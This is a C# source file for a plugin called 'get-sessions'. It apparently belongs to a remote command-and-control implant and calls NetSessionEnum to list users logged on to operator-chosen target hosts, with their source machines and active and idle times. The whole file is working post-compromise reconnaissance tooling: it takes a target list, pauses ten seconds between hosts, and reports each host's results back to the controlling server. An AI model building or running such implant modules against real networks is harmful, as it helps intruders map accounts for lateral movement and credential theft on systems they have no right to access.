using System;
using System.Net;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "get-sessions";
        //Thank you PInvoke
        [DllImport("netapi32.dll", SetLastError = true)]
        private static extern int NetSessionEnum(
        [In, MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        [In, MarshalAs(UnmanagedType.LPWStr)] string UncClientName,
        [In, MarshalAs(UnmanagedType.LPWStr)] string UserName,
        Int32 Level,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        ref Int32 resume_handle);


        [StructLayout(LayoutKind.Sequential)]
        struct SESSION_INFO_10
        {
            /// <summary>
            /// Unicode string specifying the name of the computer that established the session.
            /// </summary>
            [MarshalAs(UnmanagedType.LPWStr)] public string sesi10_cname;
            /// <summary>
            /// <value>Unicode string specifying the name of the user who established the session.</value>
            /// </summary>
            [MarshalAs(UnmanagedType.LPWStr)] public string sesi10_username;
            /// <summary>
            /// <value>Specifies the number of seconds the session has been active. </value>
            /// </summary>
            public uint sesi10_time;
            /// <summary>
            /// <value>Specifies the number of seconds the session has been idle.</value>
            /// </summary>
            public uint sesi10_idle_time;
        }
        enum NERR
        {
            /// <summary>
            /// Operation was a success.
            /// </summary>
            NERR_Success = 0,
            /// <summary>
            /// More data available to read. dderror getting all data.
            /// </summary>
            ERROR_MORE_DATA = 234,
            /// <summary>
            /// Network browsers not available.
            /// </summary>
            ERROR_NO_BROWSER_SERVERS_FOUND = 6118,
            /// <summary>
            /// LEVEL specified is not valid for this call.
            /// </summary>
            ERROR_INVALID_LEVEL = 124,
            /// <summary>
            /// Security context does not have permission to make this call.
            /// </summary>
            ERROR_ACCESS_DENIED = 5,
            /// <summary>
            /// Parameter was incorrect.
            /// </summary>
            ERROR_INVALID_PARAMETER = 87,
            /// <summary>
            /// Out of memory.
            /// </summary>
            ERROR_NOT_ENOUGH_MEMORY = 8,
            /// <summary>
            /// Unable to contact resource. Connection timed out.
            /// </summary>
            ERROR_NETWORK_BUSY = 54,
            /// <summary>
            /// Network Path not found.
            /// </summary>
            ERROR_BAD_NETPATH = 53,
            /// <summary>
            /// No available network connection to make call.
            /// </summary>
            ERROR_NO_NETWORK = 1222,
            /// <summary>
            /// Pointer is not valid.
            /// </summary>
            ERROR_INVALID_HANDLE_STATE = 1609,
            /// <summary>
            /// Extended Error.
            /// </summary>
            ERROR_EXTENDED_ERROR = 1208,
            /// <summary>
            /// Base.
            /// </summary>
            NERR_BASE = 2100,
            /// <summary>
            /// Unknown Directory.
            /// </summary>
            NERR_UnknownDevDir = (NERR_BASE + 16),
            /// <summary>
            /// Duplicate Share already exists on server.
            /// </summary>
            NERR_DuplicateShare = (NERR_BASE + 18),
            /// <summary>
            /// Memory allocation was to small.
            /// </summary>
            NERR_BufTooSmall = (NERR_BASE + 23)
        }
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                string[] targets;

                if (args.ContainsKey("targetlist"))
                {
                    if (args["targetlist"].ToString() != "")
                    {
                        targets = GetTargetsFromFile(Convert.FromBase64String(args["targetlist"].ToString())).ToArray<string>();
                    }
                    else
                    {
                        messageManager.Write("A file was provided but contained no data", job.task.id, true, "error");
                        return;
                    }
                }
                else
                {
                    targets = args["hosts"].ToString().Split(',');
                }

                if (targets.Count() < 1)
                {
                    messageManager.Write("No targets provided.", job.task.id, true, "error");
                    return;
                }

                foreach (var server in targets)
                {
                    StringBuilder sb = new StringBuilder();

                    try
                    {
                        IntPtr BufPtr;
                        int res = 0;
                        Int32 er = 0, tr = 0, resume = 0;
                        BufPtr = (IntPtr)Marshal.SizeOf(typeof(SESSION_INFO_10));
                        SESSION_INFO_10[] results = new SESSION_INFO_10[0];
                        do
                        {
                            res = NetSessionEnum(server, null, null, 10, out BufPtr, -1, ref er, ref tr, ref resume);
                            results = new SESSION_INFO_10[er];
                            if (res == (int)NERR.ERROR_MORE_DATA || res == (int)NERR.NERR_Success)
                            {
                                long p = BufPtr.ToInt64();
                                for (int i = 0; i < er; i++)
                                {

                                    SESSION_INFO_10 si = (SESSION_INFO_10)Marshal.PtrToStructure(new IntPtr(p), typeof(SESSION_INFO_10));
                                    results[i] = si;
                                    p += Marshal.SizeOf(typeof(SESSION_INFO_10));
                                }
                            }
                            Marshal.FreeHGlobal(BufPtr);
                        }
                        while (res == (int)NERR.ERROR_MORE_DATA);

                        int sess = 0;
                        sb.AppendLine("Sessions for: " + server);
                        foreach (var result in results)
                        {
                            sb.AppendLine($"SessionID: {sess}");
                            sb.AppendLine("---------------------------------------");
                            sb.AppendLine($"Username: {result.sesi10_username}");
                            sb.AppendLine($"From: {result.sesi10_cname}");
                            sb.AppendLine($"Time Active: {result.sesi10_time}");
                            sb.AppendLine($"Time Idle: {result.sesi10_idle_time}");
                            sb.AppendLine("---------------------------------------\r\n");
                            sb.AppendLine();
                            sess++;
                        }

                        //Add output as we update
                        messageManager.Write(sb.ToString(), job.task.id, false);
                    }
                    catch (Exception e)
                    {
                        messageManager.Write(e.ToString(), job.task.id, true, "error");
                    }
                    Thread.Sleep(10000);
                }

            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
                return;
            }

            messageManager.Write("Execution Finished.", job.task.id, true);
        }
        private IEnumerable<string> GetTargetsFromFile(byte[] b)
        {
            string allData = Misc.GetEncoding(b).GetString(b);

            return allData.Split(Environment.NewLine);
        }
    }
}
